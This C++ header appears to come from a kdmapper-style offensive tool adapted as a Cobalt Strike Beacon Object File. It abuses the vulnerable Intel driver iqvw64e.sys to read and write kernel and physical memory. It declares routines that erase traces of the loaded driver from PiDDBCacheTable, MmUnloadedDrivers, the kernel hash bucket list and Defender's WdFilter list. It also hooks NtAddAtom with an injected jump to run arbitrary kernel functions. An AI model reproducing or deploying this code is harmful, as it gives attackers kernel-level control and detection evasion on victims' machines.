#pragma once
#include "monolith.hpp"
#include "intel_driver_resource.hpp"
#include "service.hpp"
#include "utils.hpp"

#define WMAX_PATH (MAX_PATH + 1 * sizeof(wchar_t))

namespace Intel {
	__attribute__((used, section(".data"))) WCHAR driver_name[200] = { }; //NOTE: "iqvw64e.sys" TODO: to be loaded by the BOF
	__attribute__((used, section(".data"))) WCHAR driver_reg_path[] = L"\\Registry\\Machine\\System\\CurrentControlSet\\Services\\";
	__attribute__((used, section(".data"))) WCHAR service_path[] = L"SYSTEM\\CurrentControlSet\\Services";

	__attribute__((used, section(".rdata"))) STATIC CONST CHAR alphanum[] = {
		0x61,0x62,0x63,0x64,0x65,0x66,0x67,0x68,0x69,0x6a,0x6b,0x6c,0x6d,0x6e,0x6f,0x70,0x71,0x72,0x73,0x74,0x75,0x76,0x77,0x78,0x79,0x7a,
		0x41,0x42,0x43,0x44,0x45,0x46,0x47,0x48,0x49,0x4a,0x4b,0x4c,0x4d,0x4e,0x4f,0x50,0x51,0x52,0x53,0x54,0x55,0x56,0x57,0x58,0x59,0x5a
	};
		
	constexpr DWORD timestamp = 0x5284EAC3;

	BOOL ClearPiDDBCacheTable(HANDLE handle);
	BOOL ExAcquireResourceExclusiveLite(HANDLE handle, PVOID resource, BOOLEAN wait);
	BOOL ExReleaseResourceLite(HANDLE handle, PVOID resource);
	BOOLEAN RtlDeleteElementGenericTableAvl(HANDLE handle, PVOID table, PVOID buffer);
	PVOID RtlLookupElementGenericTableAvl(HANDLE handle, PRTL_AVL_TABLE table, PVOID buffer);
	PiDDBCacheEntry* LookupEntry(HANDLE handle, PRTL_AVL_TABLE cache_table, ULONG timestamp, CONST WCHAR *name);
	PVOID ResolveRelativeAddress(HANDLE handle, PVOID instruction, ULONG offset, ULONG instruction_size);
	BOOL AcquireDebugPrivilege();

	UINT_PTR FindPatternAtKernel(HANDLE handle, UINT_PTR address, UINT_PTR size, UINT8 *mask, CONST CHAR *sz_mask);
	UINT_PTR FindSectionAtKernel(HANDLE handle, CONST CHAR *sec_name, UINT_PTR module_ptr, PULONG size);
	UINT_PTR FindPatternInSectionAtKernel(HANDLE handle, CONST CHAR *sec_name, UINT_PTR module_ptr, UINT8 *mask, CONST CHAR *sz_mask);

	BOOL ClearKernelHashBucketList(HANDLE handle);
	BOOL ClearWdFilterDriverList(HANDLE handle);

	BOOL IsRunning();
	HANDLE LoadDriver();
	BOOL Unload(HANDLE handle);

	UINT64 MapIoSpace(HANDLE handle, UINT_PTR physical_address, UINT32 size);
	BOOL UnmapIoSpace(HANDLE handle, UINT_PTR address, UINT32 size);

	BOOL GetPhysicalAddress(HANDLE handle, UINT_PTR address, UINT_PTR* out_physical_address);
	BOOL ReadMemory(HANDLE handle, UINT_PTR address, void* buffer, UINT_PTR size);
	BOOL WriteMemory(HANDLE handle, UINT_PTR address, void* buffer, UINT_PTR size);
	BOOL WriteToReadOnlyMemory(HANDLE handle, UINT_PTR address, void* buffer, UINT32 size);

	/*added by herooyyy*/
	UINT_PTR MmAllocateIndependentPagesEx(HANDLE handle, UINT32 size);
	BOOL MmFreeIndependentPages(HANDLE handle, UINT_PTR address, UINT32 size);
	BOOLEAN MmSetPageProtection(HANDLE handle, UINT_PTR address, UINT32 size, ULONG new_protect);
	
	UINT_PTR AllocatePool(HANDLE handle, nt::POOL_TYPE pool_type, UINT_PTR size);

	bool FreePool(HANDLE handle, UINT_PTR address);
	UINT_PTR GetKernelModuleExport(HANDLE handle, UINT_PTR kernel_module_base, const std::string& function_name);
	bool ClearMmUnloadedDrivers(HANDLE handle);
	std::wstring GetDriverNameW();
	LPWSTR GetDriverPath();

	// NOTE: exposed in order to use templates ig. Not sure it's necessary.
	template<typename T, typename ...A>
	bool CallKernelFunction(HANDLE handle, T *out_result, UINT_PTR kernel_function_address, const A ...arguments) {
		constexpr auto call_void = std::is_same_v<T, void>;

		//if count of arguments is >4 fail
		static_assert(sizeof...(A) <= 4);

		if constexpr (!call_void) {
			if (!out_result) {
				return false;
			}
		}
		else {
			UNREFERENCED_PARAMETER(out_result);
		}

		if (!kernel_function_address) {
			return false;
		}

		// Setup function call
		// TODO: add NtAddAtom to API list
		HMODULE ntdll = (HMODULE) FindModuleEntry(NTDLL)->DllBase;
		if (!ntdll) {
			return false;
		}

		const auto NtAddAtom = reinterpret_cast<void*>(GetProcAddress(ntdll, "NtAddAtom"));
		if (!NtAddAtom) {
			return false;
		}

		UINT8 injected_jmp[] = { 0x48, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xff, 0xe0 };
		UINT8 org_function[sizeof(injected_jmp)];
		*(UINT_PTR*) &injected_jmp[2] = kernel_function_address;

		// TODO: add ntoskrnl.exe to hash list
		static UINT_PTR nt_add_atom = GetKernelModuleExport(handle, intel_driver::ntoskrnl_addr, "NtAddAtom");
		if (!nt_add_atom) {
			return false;
		}

		if (!Beacon$ReadMemory(handle, &org_function, nt_add_atom, sizeof(injected_jmp)))
			return false;

		if (org_function[0] == injected_jmp[0] &&
			org_function[1] == injected_jmp[1] &&
			org_function[sizeof(injected_jmp) - 2] == injected_jmp[sizeof(injected_jmp) - 2] &&
			org_function[sizeof(injected_jmp) - 1] == injected_jmp[sizeof(injected_jmp) - 1]) {
			return false;
		}

		// Overwrite the pointer with kernel_function_address
		if (!Beacon$WriteToReadOnlyMemory(handle, &injected_jmp, nt_add_atom, sizeof(injected_jmp)))
			return false;

		// Call function
		if constexpr (!call_void) {
			using FunctionFn = T(__stdcall*)(A...);
			const auto Function = (FunctionFn) NtAddAtom;

			*out_result = Function(arguments...);
		}
		else {
			using FunctionFn = void(__stdcall*)(A...);
			const auto Function = (FunctionFn) NtAddAtom;

			Function(arguments...);
		}

		// Restore the pointer/jmp
		return Beacon$WriteToReadOnlyMemory(handle, nt_add_atom, org_function, sizeof(injected_jmp));
	}
}
